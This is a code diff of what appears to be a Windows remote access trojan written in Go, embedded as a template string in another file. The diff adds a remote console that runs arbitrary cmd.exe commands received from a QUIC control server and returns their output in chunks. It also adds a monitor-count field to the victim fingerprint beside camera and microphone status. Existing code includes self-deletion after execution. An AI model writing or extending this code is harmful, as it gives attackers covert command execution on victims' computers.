@@ -42,6 +42,7 @@ package main
 
 import (
     ""bufio""
+    ""bytes""
     ""context""
     ""crypto/sha1""
     ""crypto/tls""
@@ -89,14 +90,16 @@ type UserPayload struct {{
     CameraStatus     bool   `json:""CameraStatus""`
     MicrophoneStatus bool   `json:""MicrophoneStatus""`
     Ping             string `json:""Ping""`
+    MonitorCount     int    `json:""MonitorCount""`
 }}
 
 type Message struct {{
-    Channel string       `json:""Channel""`
-    Type    string       `json:""Type""`
-    User    *UserPayload `json:""User,omitempty""`
-    PingID  string       `json:""PingId,omitempty""`
-    Command string       `json:""Command,omitempty""`
+    Channel       string       `json:""Channel""`
+    Type          string       `json:""Type""`
+    User          *UserPayload `json:""User,omitempty""`
+    PingID        string       `json:""PingId,omitempty""`
+    Command       string       `json:""Command,omitempty""`
+    ConsoleOutput string       `json:""ConsoleOutput,omitempty""`
 }}
 
 type streamWriter struct {{
@@ -393,6 +396,7 @@ func connectAndServe(ctx context.Context, endpoint string) error {{
         CameraStatus:     getCameraStatus(),
         MicrophoneStatus: getMicrophoneStatus(),
         Ping:             ""0"",
+        MonitorCount:     getMonitorCount(),
     }}
 
     hello := Message{{Channel: channelMain, Type: typeHello, User: &user}}
@@ -433,6 +437,34 @@ func handleInboundStream(ctx context.Context, stream *quic.ReceiveStream, writer
         }}
 
         if msg.Channel == channelControl && msg.Type == typeCommand {{
+            if strings.HasPrefix(msg.Command, ""remote_console:"") {{
+                command := strings.TrimPrefix(msg.Command, ""remote_console:"")
+                output, err := executeCommand(command)
+                if err != nil {{
+                    output = fmt.Sprintf(""Error: %v\n"", err)
+                }}
+
+                const maxChunkSize = 12000
+                for len(output) > 0 {{
+                    chunkSize := maxChunkSize
+                    if len(output) < chunkSize {{
+                        chunkSize = len(output)
+                    }}
+
+                    reply := Message{{
+                        Channel:       channelControl,
+                        Type:          ""console_output"",
+                        ConsoleOutput: output[:chunkSize],
+                    }}
+                    output = output[chunkSize:]
+
+                    if err := writer.Write(reply); err != nil {{
+                        return err
+                    }}
+                }}
+                continue
+            }}
+
             switch msg.Command {{
             case ""close_client"":
                 return errCloseClient
@@ -527,6 +559,39 @@ func scheduleSelfDelete() error {{
 
     command := fmt.Sprintf(`ping 127.0.0.1 -n 2 > nul & del /f /q ""%s""`, exePath)
     return exec.Command(""cmd"", ""/C"", command).Start()
+}}
+
+func getMonitorCount() int {{
+    proc := syscall.NewLazyDLL(""user32.dll"").NewProc(""GetSystemMetrics"")
+    const SM_CMONITORS = 80
+    ret, _, _ := proc.Call(SM_CMONITORS)
+    n := int(ret)
+    if n < 1 {{
+        return 1
+    }}
+    return n
+}}
+
+func executeCommand(command string) (string, error) {{
+    cmd := exec.Command(""cmd"", ""/C"", command)
+    var stdout, stderr bytes.Buffer
+    cmd.Stdout = &stdout
+    cmd.Stderr = &stderr
+    err := cmd.Run()
+
+    output := stdout.String()
+    if stderr.Len() > 0 {{
+        if output != """" {{
+            output += ""\n""
+        }}
+        output += stderr.String()
+    }}
+
+    if err != nil && output == """" {{
+        return """", err
+    }}
+
+    return output, nil
 }}
 ";
             return src;
